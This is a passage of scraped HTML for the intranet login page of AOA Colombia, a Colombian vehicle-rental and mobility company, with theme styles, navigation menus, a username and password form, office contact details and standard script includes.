span:after {border-color: #222222;}.alt-six .full-width-text:after {border-top-color:#FFFFFF;}.alt-six h4.spb-text-heading, .alt-six h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-seven {background-color: #FFFFFF;}.asset-bg.alt-seven, .asset-bg .alt-seven, .asset-bg.alt-seven h1, .asset-bg.alt-seven h2, .asset-bg.alt-seven h3, .asset-bg.alt-seven h3, .asset-bg.alt-seven h4, .asset-bg.alt-seven h5, .asset-bg.alt-seven h6, .alt-seven .carousel-wrap > a {color: #222222;}.asset-bg.alt-seven h4.spb-center-heading span:before, .asset-bg.alt-seven h4.spb-center-heading span:after {border-color: #222222;}.alt-seven .full-width-text:after {border-top-color:#FFFFFF;}.alt-seven h4.spb-text-heading, .alt-seven h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-eight {background-color: #FFFFFF;}.asset-bg.alt-eight, .asset-bg .alt-eight, .asset-bg.alt-eight h1, .asset-bg.alt-eight h2, .asset-bg.alt-eight h3, .asset-bg.alt-eight h3, .asset-bg.alt-eight h4, .asset-bg.alt-eight h5, .asset-bg.alt-eight h6, .alt-eight .carousel-wrap > a {color: #222222;}.asset-bg.alt-eight h4.spb-center-heading span:before, .asset-bg.alt-eight h4.spb-center-heading span:after {border-color: #222222;}.alt-eight .full-width-text:after {border-top-color:#FFFFFF;}.alt-eight h4.spb-text-heading, .alt-eight h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-nine {background-color: #FFFFFF;}.asset-bg.alt-nine, .asset-bg .alt-nine, .asset-bg.alt-nine h1, .asset-bg.alt-nine h2, .asset-bg.alt-nine h3, .asset-bg.alt-nine h3, .asset-bg.alt-nine h4, .asset-bg.alt-nine h5, .asset-bg.alt-nine h6, .alt-nine .carousel-wrap > a {color: #222222;}.asset-bg.alt-nine h4.spb-center-heading span:before, .asset-bg.alt-nine h4.spb-center-heading span:after {border-color: #222222;}.alt-nine .full-width-text:after {border-top-color:#FFFFFF;}.alt-nine h4.spb-text-heading, .alt-nine h4.spb-heading {border-bottom-color:#222222;}.asset-bg.alt-ten {background-color: #FFFFFF;}.asset-bg.alt-ten, .asset-bg .alt-ten, .asset-bg.alt-ten h1, .asset-bg.alt-ten h2, .asset-bg.alt-ten h3, .asset-bg.alt-ten h3, .asset-bg.alt-ten h4, .asset-bg.alt-ten h5, .asset-bg.alt-ten h6, .alt-ten .carousel-wrap > a {color: #222222;}.asset-bg.alt-ten h4.spb-center-heading span:before, .asset-bg.alt-ten h4.spb-center-heading span:after {border-color: #222222;}.alt-ten .full-width-text:after {border-top-color:#FFFFFF;}.alt-ten h4.spb-text-heading, .alt-ten h4.spb-heading {border-bottom-color:#222222;}.asset-bg.light-style, .asset-bg.light-style h1, .asset-bg.light-style h2, .asset-bg.light-style h3, .asset-bg.light-style h3, .asset-bg.light-style h4, .asset-bg.light-style h5, .asset-bg.light-style h6 {color: #fff!important;}.asset-bg.dark-style, .asset-bg.dark-style h1, .asset-bg.dark-style h2, .asset-bg.dark-style h3, .asset-bg.dark-style h3, .asset-bg.dark-style h4, .asset-bg.dark-style h5, .asset-bg.dark-style h6 {color: #222!important;}#main-container { background: transparent url('https://www.aoacolombia.com/wp-content/uploads/2019/10/fondo-intranet-AOA-Colombia.jpg') repeat center top; background-size: auto; }.standard-post-content, .blog-aux-options li a, .blog-aux-options li form input, .masonry-items .blog-item .masonry-item-wrap, .widget .wp-tag-cloud li a, ul.portfolio-filter-tabs li.selected a, .masonry-items .portfolio-item-details {background: #FFFFFF;}.format-quote .standard-post-content:before, .standard-post-content.no-thumb:before {border-left-color: #FFFFFF;}body, h6, #sidebar .widget-heading h3, #header-search input, .header-items h3.phone-number, .related-wrap h4, #comments-list > h3, .item-heading h1, .sf-button, button, input[type='submit'], input[type='email'], input[type='reset'], input[type='button'], .spb_accordion_section h3, #header-login input, #mobile-navigation > div, .search-form input, input, button, select, textarea {font-family: 'Arial', Arial, Helvetica, Tahoma, sans-serif;}h1, h2, h3, h4, h5, .custom-caption p, span.dropcap1, span.dropcap2, span.dropcap3, span.dropcap4, .spb_call_text, .impact-text, .impact-text-large, .testimonial-text, .header-advert, .sf-count-asset .count-number, #base-promo, .sf-countdown, .fancy-heading h1, .sf-icon-character {font-family: 'Arial', Arial, Helvetica, Tahoma, sans-serif;}nav .menu li {font-family: 'Arial', Arial, Helvetica, Tahoma, sans-serif;}.mobile-browser .sf-animation, .apple-mobile-browser .sf-animation {
					opacity: 1!important;
					left: auto!important;
					right: auto!important;
					bottom: auto!important;
					-webkit-transform: scale(1)!important;
					-o-transform: scale(1)!important;
					-moz-transform: scale(1)!important;
					transform: scale(1)!important;
				}
				.mobile-browser .sf-animation.image-banner-content, .apple-mobile-browser .sf-animation.image-banner-content {
					bottom: 50%!important;
				}@media only screen and (max-width: 767px) {#top-bar nav .menu > li {border-top-color: #f7f7f7;}nav .menu > li {border-top-color: #a8ad00;}}</style>
<meta name='generator' content='Powered by Slider Revolution 6.0.9 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.' />
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
<link rel='icon' href='https://www.aoacolombia.com/wp-content/uploads/2019/09/cropped-icono-AOA-Colombia-32x32.png' sizes='32x32' />
<link rel='icon' href='https://www.aoacolombia.com/wp-content/uploads/2019/09/cropped-icono-AOA-Colombia-192x192.png' sizes='192x192' />
<link rel='apple-touch-icon-precomposed' href='https://www.aoacolombia.com/wp-content/uploads/2019/09/cropped-icono-AOA-Colombia-180x180.png' />
<meta name='msapplication-TileImage' content='https://www.aoacolombia.com/wp-content/uploads/2019/09/cropped-icono-AOA-Colombia-270x270.png' />
<script type='text/javascript'>function setREVStartSize(a){try{var b,c=document.getElementById(a.c).parentNode.offsetWidth;if(c=0===c||isNaN(c)?window.innerWidth:c,a.tabw=void 0===a.tabw?0:parseInt(a.tabw),a.thumbw=void 0===a.thumbw?0:parseInt(a.thumbw),a.tabh=void 0===a.tabh?0:parseInt(a.tabh),a.thumbh=void 0===a.thumbh?0:parseInt(a.thumbh),a.tabhide=void 0===a.tabhide?0:parseInt(a.tabhide),a.thumbhide=void 0===a.thumbhide?0:parseInt(a.thumbhide),a.mh=void 0===a.mh||''==a.mh?0:a.mh,'fullscreen'===a.layout||'fullscreen'===a.l)b=Math.max(a.mh,window.innerHeight);else{for(var d in a.gw=Array.isArray(a.gw)?a.gw:[a.gw],a.rl)(void 0===a.gw[d]||0===a.gw[d])&&(a.gw[d]=a.gw[d-1]);for(var d in a.gh=void 0===a.el||''===a.el||Array.isArray(a.el)&&0==a.el.length?a.gh:a.el,a.gh=Array.isArray(a.gh)?a.gh:[a.gh],a.rl)(void 0===a.gh[d]||0===a.gh[d])&&(a.gh[d]=a.gh[d-1]);var e,f=Array(a.rl.length),g=0;for(var d in a.tabw=a.tabhide>=c?0:a.tabw,a.thumbw=a.thumbhide>=c?0:a.thumbw,a.tabh=a.tabhide>=c?0:a.tabh,a.thumbh=a.thumbhide>=c?0:a.thumbh,a.rl)f[d]=a.rl[d]<window.innerWidth?0:a.rl[d];for(var d in e=f[0],f)e>f[d]&&0<f[d]&&(e=f[d],g=d);var h=c>a.gw[g]+a.tabw+a.thumbw?1:(c-(a.tabw+a.thumbw))/a.gw[g];b=a.gh[g]*h+(a.tabh+a.thumbh)}void 0===window.rs_init_css&&(window.rs_init_css=document.head.appendChild(document.createElement('style'))),document.getElementById(a.c).height=b,window.rs_init_css.innerHTML+='#'+a.c+'_wrapper { height: '+b+'px }'}catch(a){console.log('Failure at Presize of Slider:'+a)}};</script>
			
	<!--// CLOSE HEAD //-->
	</head>
	
	<!--// OPEN BODY //-->
	<body class='page-template-default page page-id-79 wp-custom-logo mini-header-enabled page-shadow header-shadow layout-fullwidth responsive-fluid search-1'>
		
		<div id='header-search'>
			<div class='container clearfix'>
				<i class='ss-search'></i>
				<form method='get' class='search-form' action='https://www.aoacolombia.com/'><input type='text' placeholder='Search for something...' name='s' autocomplete='off' /></form>
				<a id='header-search-close' href='#'><i class='ss-delete'></i></a>
			</div>
		</div>
		
				
	<div id='mobile-menu-wrap'>
<form method='get' class='mobile-search-form' action='http://www.aoacolombia.com/'><input type='text' placeholder='Search' name='s' autocomplete='off' /></form>
<a class='mobile-menu-close'><i class='ss-delete'></i></a>
<nav id='mobile-menu' class='clearfix'>
<div class='menu-aoa-principal-container'><ul id='menu-aoa-principal' class='menu'><li  class='menu-item-787 menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-has-children   '><a title='Servicios integrales de movilidad' href='http://www.aoacolombia.com/'><span class='menu-item-text'>Servicios<span class='nav-line'></span></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-100 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Vehículo de Reemplazo AOA Colombia' href='http://www.aoacolombia.com/index.php/vehiculo-de-reemplazo/'>Vehículo de Reemplazo</a></li>
	<li  class='menu-item-99 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Renta de Vehículos AOA Colombia' href='http://www.aoacolombia.com/index.php/renta-de-vehiculos/'>Renta de Vehículos</a></li>
	<li  class='menu-item-98 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Renting Operativo AOA Colombia' href='http://www.aoacolombia.com/index.php/renting-operativo/'>Renting Operativo</a></li>
	<li  class='menu-item-97 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Transporte Especial AOA Colombia' href='http://www.aoacolombia.com/index.php/transporte-especial/'>Transporte Especial</a></li>
</ul>
</li>
<li  class='menu-item-74 menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children   '><a title='Conócenos Información Corporativa AOA Colombia' href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/'><span class='menu-item-text'>Conócenos<span class='nav-line'></span></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-1174 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Nuestra Empresa Información Corporativa AOA Colombia' href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/'>Nuestra Empresa</a></li>
	<li  class='menu-item-2578 menu-item menu-item-type-custom menu-item-object-custom   '><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#mision'>Misión</a></li>
	<li  class='menu-item-2577 menu-item menu-item-type-custom menu-item-object-custom   '><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#vision'>Visión</a></li>
	<li  class='menu-item-2583 menu-item menu-item-type-custom menu-item-object-custom   '><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#politica-sistema-gestion-calidad'>Política Sistema de la Gestión de Calidad</a></li>
	<li  class='menu-item-1177 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Oficinas a Nivel Nacional AOA Colombia' href='http://www.aoacolombia.com/index.php/oficinas-a-nivel-nacional/'>Oficinas a Nivel Nacional</a></li>
</ul>
</li>
<li  class='menu-item-73 menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-71 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children   '><a title='Contacto AOA Colombia' href='http://www.aoacolombia.com/index.php/contacto-aoa-colombia/'><span class='menu-item-text'>Contacto<span class='nav-line'></span></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-1306 menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-71 current_page_item   '><a title='Call Center AOA Colombia' href='http://www.aoacolombia.com/index.php/contacto-aoa-colombia/'>Call Center</a></li>
	<li  class='menu-item-1305 menu-item menu-item-type-post_type menu-item-object-page   '><a href='http://www.aoacolombia.com/index.php/contacto-por-aseguradora/'>Contacto por Aseguradora</a></li>
	<li  class='menu-item-1333 menu-item menu-item-type-post_type menu-item-object-page   '><a title='FAQ AOA Colombia' href='http://www.aoacolombia.com/index.php/faq-aoa-colombia/'>Preguntas Frecuentes</a></li>
	<li  class='menu-item-1304 menu-item menu-item-type-post_type menu-item-object-page   '><a title='PQR AOA Colombia' href='http://www.aoacolombia.com/index.php/pqr-aoa-colombia-2/'>Peticiones, Quejas y Reclamos</a></li>
	<li  class='menu-item-1303 menu-item menu-item-type-post_type menu-item-object-page   '><a href='http://www.aoacolombia.com/index.php/aviso-de-privacidad/'>Aviso de Privacidad</a></li>
	<li  class='menu-item-1302 menu-item menu-item-type-post_type menu-item-object-page   '><a href='http://www.aoacolombia.com/index.php/politica-de-proteccion-de-datos/'>Política de Protección de Datos</a></li>
	<li  class='menu-item-1301 menu-item menu-item-type-post_type menu-item-object-page   '><a href='http://www.aoacolombia.com/index.php/politica-anticorrupcion/'>Política Anticorrupción</a></li>
</ul>
</li>
<li  class='menu-item-82 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Clientes AOA Colombia' href='http://www.aoacolombia.com/index.php/clientes-aoa-colombia/'><span class='menu-item-text'>Clientes<span class='nav-line'></span></span></a></li>
<li  class='menu-item-81 menu-item menu-item-type-post_type menu-item-object-page   '><a title='Intranet AOA Colombia' href='https://app.aoacolombia.com/intranet/login.php'><span class='menu-item-text'>Intranet<span class='nav-line'></span></span></a></li>
</ul></div></nav>
</div>
		
		<!--// OPEN #container //-->
				<div id='container'>
					
			<!--// HEADER //-->
			<div class='header-wrap'>
				
					
					
				<div id='header-section' class='header-6 logo-fade'>
					<header id='header' class='sticky-header clearfix'>
<div class='container'>
<div class='row'>
<div id='logo' class='logo-left clearfix'>
<a href='http://www.aoacolombia.com'>
<img class='standard' src='http://www.aoacolombia.com/wp-content/uploads/2019/09/cropped-logotipo-aoa-colombia-1.png' alt='AOA Colombia' width='500' height='50' />
</a>
<a href='#' class='visible-sm visible-xs mobile-menu-show'><i class='ss-rows'></i></a>
</div>
<div class='header-right'><nav class='search-nav std-menu'>
<ul class='menu'>
<li class='menu-search parent'><a href='#' class='header-search-link'><i class='ss-search'></i></a></li>
</ul>
</nav>
<nav id='main-navigation' class='mega-menu clearfix'>
<div class='menu-aoa-principal-container'><ul id='menu-aoa-principal-1' class='menu'><li  class='menu-item-787 menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-has-children       ' ><a title='Servicios integrales de movilidad' href='http://www.aoacolombia.com/'>Servicios<span class='nav-line'></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-100 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Vehículo de Reemplazo AOA Colombia' href='http://www.aoacolombia.com/index.php/vehiculo-de-reemplazo/'>Vehículo de Reemplazo</a></li>
	<li  class='menu-item-99 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Renta de Vehículos AOA Colombia' href='http://www.aoacolombia.com/index.php/renta-de-vehiculos/'>Renta de Vehículos</a></li>
	<li  class='menu-item-98 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Renting Operativo AOA Colombia' href='http://www.aoacolombia.com/index.php/renting-operativo/'>Renting Operativo</a></li>
	<li  class='menu-item-97 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Transporte Especial AOA Colombia' href='http://www.aoacolombia.com/index.php/transporte-especial/'>Transporte Especial</a></li>
</ul>
</li>
<li  class='menu-item-74 menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children       ' ><a title='Conócenos Información Corporativa AOA Colombia' href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/'>Conócenos<span class='nav-line'></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-1174 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Nuestra Empresa Información Corporativa AOA Colombia' href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/'>Nuestra Empresa</a></li>
	<li  class='menu-item-2578 menu-item menu-item-type-custom menu-item-object-custom       ' ><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#mision'>Misión</a></li>
	<li  class='menu-item-2577 menu-item menu-item-type-custom menu-item-object-custom       ' ><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#vision'>Visión</a></li>
	<li  class='menu-item-2583 menu-item menu-item-type-custom menu-item-object-custom       ' ><a href='http://www.aoacolombia.com/index.php/informacion-corporativa-aoa-colombia/#politica-sistema-gestion-calidad'>Política Sistema de la Gestión de Calidad</a></li>
	<li  class='menu-item-1177 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Oficinas a Nivel Nacional AOA Colombia' href='http://www.aoacolombia.com/index.php/oficinas-a-nivel-nacional/'>Oficinas a Nivel Nacional</a></li>
</ul>
</li>
<li  class='menu-item-73 menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-71 current_page_item current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children       ' ><a title='Contacto AOA Colombia' href='http://www.aoacolombia.com/index.php/contacto-aoa-colombia/'>Contacto<span class='nav-line'></span></a>
<ul class='sub-menu'>
	<li  class='menu-item-1306 menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-71 current_page_item       ' ><a title='Call Center AOA Colombia' href='http://www.aoacolombia.com/index.php/contacto-aoa-colombia/'>Call Center</a></li>
	<li  class='menu-item-1305 menu-item menu-item-type-post_type menu-item-object-page       ' ><a href='http://www.aoacolombia.com/index.php/contacto-por-aseguradora/'>Contacto por Aseguradora</a></li>
	<li  class='menu-item-1333 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='FAQ AOA Colombia' href='http://www.aoacolombia.com/index.php/faq-aoa-colombia/'>Preguntas Frecuentes</a></li>
	<li  class='menu-item-1304 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='PQR AOA Colombia' href='http://www.aoacolombia.com/index.php/pqr-aoa-colombia-2/'>Peticiones, Quejas y Reclamos</a></li>
	<li  class='menu-item-1303 menu-item menu-item-type-post_type menu-item-object-page       ' ><a href='http://www.aoacolombia.com/index.php/aviso-de-privacidad/'>Aviso de Privacidad</a></li>
	<li  class='menu-item-1302 menu-item menu-item-type-post_type menu-item-object-page       ' ><a href='http://www.aoacolombia.com/index.php/politica-de-proteccion-de-datos/'>Política de Protección de Datos</a></li>
	<li  class='menu-item-1301 menu-item menu-item-type-post_type menu-item-object-page       ' ><a href='http://www.aoacolombia.com/index.php/politica-anticorrupcion/'>Política Anticorrupción</a></li>
</ul>
</li>
<li  class='menu-item-82 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Clientes AOA Colombia' href='http://www.aoacolombia.com/index.php/clientes-aoa-colombia/'>Clientes<span class='nav-line'></span></a></li>
<li  class='menu-item-81 menu-item menu-item-type-post_type menu-item-object-page       ' ><a title='Intranet AOA Colombia' href='https://app.aoacolombia.com/intranet/login.php'>Intranet<span class='nav-line'></span></a></li>
</ul></div></nav>

</div>
</div> <!-- CLOSE .row -->
</div> <!-- CLOSE .container -->
</header>
				</div>

			</div>
			

			
			<!--// OPEN #main-container //-->
			<div id='main-container' class='clearfix'>
				
												
				            
            			<div class='page-heading page-heading-hidden clearfix asset-bg none'>
			                <div class='container'>
                    <div class='heading-text'>

                        
                            <h1 class='entry-title'>Intranet AOA Colombia</h1>

                                                
                        
                    </div>

					<div id='breadcrumbs'>
<span property='itemListElement' typeof='ListItem'><a property='item' typeof='WebPage' title='Go to AOA Colombia.' href='https://www.aoacolombia.com' class='home' ><span property='name'>AOA Colombia</span></a><meta property='position' content='1'></span> &gt; <span class='post post-page current-item'>Intranet AOA Colombia</span></div>

                </div>
            </div>
        				
									<!--// OPEN .container //-->
					<div class='container'>
					
					
									
					<!--// OPEN #page-wrap //-->
					<div id='page-wrap'>	
					
					

<div class='inner-page-wrap has-no-sidebar clearfix'>
		
	
	<!-- OPEN page -->
	<div class='clearfix ' id='79'>
	
					<div class='page-content clearfix'>
	
				
<div class='wp-block-image'><figure class='aligncenter'><img src='https://www.aoacolombia.com/wp-content/uploads/2019/09/soluciones-movilidad-triangulo-AOA-Colombia.png' alt='Soluciones Integrales de Movilidad Icono Triángulo de Seguridad AOA Colombia' class='wp-image-144'/></figure></div>

				<div class='link-pages'></div>
				

				
				
      <pre class='wp-block-code acceso-clientes' id='Gest_admin'>
<code><div role='form' class='wpcf7' id='wpcf7-f2481-p79-o1' lang='en-US' dir='ltr'>
<div class='screen-reader-response'></div>
 <FORM name='entrada' action='../Administrativo/valida_entrada.php' method='post'  id='entrada'>

 
<div class='formulario-entrada'>
<h3>Bienvenido a Control </h3>
<div class='contenedor-formulario-entrada-izq-der'>
<div class='formulario-entrada-izq'>
    <div class='input-group mb-3'>
	  	  <button type='button'   style='color: #a8ad00;width:   
		  background-color: #a8ad00;padding: 3px 6px;' '  class=' ico btn ' > 
		 <img src='img/male.png' color:#fff;'>
	 </button>
	 
 <input   class=' class=' btn paddingcero col-sm-8' style=' color: #a8ad00; width: 80%;' ID='usuario' NAME='Usuario' type='text' 
   placeholder='Usuario'
  title='Ingresar el usuario ' SIZE='20'> 
	   <div></div>
	
	
        </div>



</div>

<div class='formulario-entrada-der '>
    <div class='input-group mb-3'>
	  <button id='show_password' type='button'   style='color: #a8ad00;
	  background-color:  #a8ad00; padding: 1px 2px;'  class='ico btn ' onclick='mostrarPassword()'> 
		 <img id='imageid' src='img/edit-tools.png' color:#fff;'>
	 </button>
 <input   class=' class=' btn paddingcero col-sm-8'  style=' color: #a8ad00; width: 80%;' ID='txtPassword' NAME='Clave' type='Password' placeholder='Contraseña'
  title='Ingresar el contraseña ' SIZE='20'> 
	   <div></div>
	
	
        </div>



</div>


</div>

			  <div class='contenedor-enviar'> 
                     <div class=' text-center contenedor-enviar'>			  
              </div>
			  		
		 <div class='contenedor-enviar'> 
							 <div style='color:red' id='MSGresult'></div>	  
              </div>
			  <div class='contenedor-enviar'> 
		 <button type='submit' style='background-color: #76881d;' class='btn btn-success' >Ingresar</button>
		</div>  
			   </div>
</div>
<div class='wpcf7-response-output wpcf7-display-none'></div></form>
<form action='../Control/operativo/valida_entrada1.php' method='post' target='_self' name='forma' id='forma'>

		<input type='hidden' name='iDU'><input type='hidden' name='cLU'>
		<input type='hidden' name='siguientePHP' value='$siguientePHP'>
		<input type='hidden' name='registroPHP' value='$registroPHP'>
		<input type='hidden' name='Creacookiesingreso' value='$Creacookiesingreso'>
		</form>		
</div></code></pre>



				<div class='franja-informacion'>
				<img class='logo-AOA-principal' src='http://www.aoacolombia.com/wp-content/uploads/2019/09/logotipo-aoa-colombia-principal.png'>
				<p class='informacion-oficina'>
					<b>Oficina Principal – Bogotá – Morato</b>
					<br>
					Carrera 69 B No. 98 A – 10
					<br>
					<b>Call Center AOA</b> 018000186262
					<br>
					Teléfono +(571) 8837069
				</p>
				<hr class='linea-vertical'>
				<p class='informacion-afiliacion'>
					<b>AOA Colombia compañía afiliada</b>
				</p>
				<img class='logo-asorenting' src='http://www.aoacolombia.com/wp-content/uploads/2020/03/logotipo-asorenting.png'>
			<img class='logo-iso' src='http://www.aoacolombia.com/wp-content/uploads/2020/03/icontec-iso-9001.png'>
			</div>

			<!-- Modal -->
			<div class='modal fade' id='myModal' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>  
			  <div class='modal-dialog' role='document'>
				<div class='modal-content'>
			
						<div class=' alert alert-warning  formulario-acceso-clientes' role='alert'>
						  <h2 class='alert-heading  text-center'>
					 <img src='../img/Covid19-V6.jpg'>
				
				  </div>
				  <div class='modal-footer'>
					<button type='button' class='btn btn-secondary' data-dismiss='modal'>Cancelar  </button>
				  </div>
				</div>
			  </div>
			</div>


	

			
								<div class='link-pages'></div>
								
												
							</div>
							
					
					<!-- CLOSE page -->
					</div>

						
					
				</div>

				<!--// WordPress Hook //-->
									
									<!--// CLOSE #page-wrap //-->			
									</div>
								
								<!--// CLOSE .container //-->
								</div>
								
							<!--// CLOSE #main-container //-->
							</div>
							
													
							<div id='footer-wrap'>
							
										
							<!--// OPEN #footer //-->
						<div id='footer-wrap'>
			
						
			<!--// OPEN #footer //-->
			<section id='footer' class=''>
				<div class='container'>
					<div id='footer-widgets' class='row clearfix'>
																		
						<div class='col-sm-12'>
													<section id='custom_html-5' class='widget_text widget widget_custom_html clearfix'><div class='textwidget custom-html-widget'><p class='parrafo-footer-1'>
	Oficinas a nivel nacional
</p>
<p class='parrafo-footer-2'>
Bogotá - Medellín - Barranquilla - Cali - Pereira - Bucaramanga - Ibague - Neiva - Cúcuta - Pasto - Villavicencio - Cartagena - Manizales - Montería - Tunja - Popayán - Valledupar - Santa Marta - Sincelejo - Armenia
</p>
<hr class='linea-footer'></div></section>												
						</div>
												
					</div>
				</div>	
			
			<!--// CLOSE #footer //-->
			</section>	
						
						
			<!--// OPEN #copyright //-->
			<footer id='copyright' class=''>
				<div class='container'>
					<p>
						©2020 - <a href='http://www.aoacolombia.com'>AOA Colombia</a> - Todos los derechos reservados | Powered by <a href='https://www.aoacolombia.com'>www.aoacolombia.com</a>												
					</p>
					<nav class='footer-menu std-menu'>
						<div class='menu-aoa-footer-container'><ul id='menu-aoa-footer' class='menu'><li id='menu-item-753' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-753'><a title='Mapa de Navegación AOA Colombia' href='http://www.aoacolombia.com/index.php/mapa-de-navegacion-aoa-colombia/'>Mapa de Navegación</a></li>
<li id='menu-item-788' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-788'><a title='Servicios integrales de movilidad' href='http://www.aoacolombia.com/'>Servicios</a></li>
<li id='menu-item-748' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-748'><a title='FAQ AOA Colombia' href='http://www.aoacolombia.com/index.php/faq-aoa-colombia/'>FAQ</a></li>
<li id='menu-item-705' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-705'><a title='Contacto AOA Colombia' href='http://www.aoacolombia.com/index.php/contacto-aoa-colombia/'>Contacto</a></li>
</ul></div>					</nav>
				</div>
			
							<!--// CLOSE #footer //-->
							</section>	
										
										
							<!--// OPEN #copyright //-->
							<footer id='copyright' class=''>
								<div class='container'>
									<p>
										©2020 - <a href='http://www.aoacolombia.com'>AOA Colombia</a> - Todos los derechos reservados												
									</p>
									<nav class='footer-menu std-menu'>
										<div class='menu-aoa-footer-container'><ul id='menu-aoa-footer' class='menu'><li id='menu-item-753' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-753'><a title='Mapa de Navegación AOA Colombia' href='https://www.aoacolombia.com/index.php/mapa-de-navegacion-aoa-colombia/'>Mapa de Navegación</a></li>
				<li id='menu-item-788' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-788'><a title='Servicios integrales de movilidad' href='https://www.aoacolombia.com/'>Servicios</a></li>
				<li id='menu-item-748' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-748'><a title='FAQ AOA Colombia' href='https://www.aoacolombia.com/index.php/faq-aoa-colombia/'>FAQ</a></li>
				<li id='menu-item-705' class='menu-item menu-item-type-post_type menu-item-object-page menu-item-705'><a title='Contacto AOA Colombia' href='https://www.aoacolombia.com/index.php/contacto-aoa-colombia/'>Contacto</a></li>
				</ul></div>					</nav>
								</div>
							<!--// CLOSE #copyright //-->
							</footer>
							
										
							</div>
						
						<!--// CLOSE #container //-->
						</div>
						
								
								<!--// BACK TO TOP //-->
						<div id='back-to-top' class='animate-top'><i class='ss-navigateup'></i></div>
								
						<!--// FULL WIDTH VIDEO //-->
						<div class='fw-video-area'><div class='fw-video-close'><i class='ss-delete'></i></div></div><div class='fw-video-spacer'></div>
						
												
						<!--// FRAMEWORK INCLUDES //-->
						<div id='sf-included' class=''></div>

									
						<!--// WORDPRESS FOOTER HOOK //-->
									<div id='sf-option-params'
								data-lightbox-enabled='1'
								data-lightbox-nav='default'
								data-lightbox-thumbs='true'
								data-lightbox-skin='light'
								data-lightbox-sharing='true'
								data-slider-slidespeed='6000'
								data-slider-animspeed='500'
								data-slider-autoplay='1'></div>
							  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js' type='text/javascript'></script>

						<script type='text/javascript'>
				/* <![CDATA[ */
				var wpcf7 = {'apiSettings':{'root':'https:\/\/www.aoacolombia.com\/webAOA\/index.php\/wp-json\/contact-form-7\/v1','namespace':'contact-form-7\/v1'}};
				/* ]]> */
				</script>
					<script language='javascript' src='../Administrativo/inc/js/aqrenc.js'></script>

				<script> 

</script>

<script src='https://www.google.com/recaptcha/api.js'></script>
	<script src='https://www.google.com/recaptcha/api.js?hl=es'></script> 
	
				
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.1.4'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/responsive-accordion-and-collapse/js/bootstrap.js?ver=5.2.5'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/responsive-accordion-and-collapse/js/accordion.js?ver=5.2.5'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/plugins/tabs-responsive/assets/js/bootstrap.js?ver=5.2.5'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/modernizr.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/bootstrap.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery-ui-1.10.2.custom.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.flexslider-min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.easing.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/owl.carousel.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/dcmegamenu.js'></script>
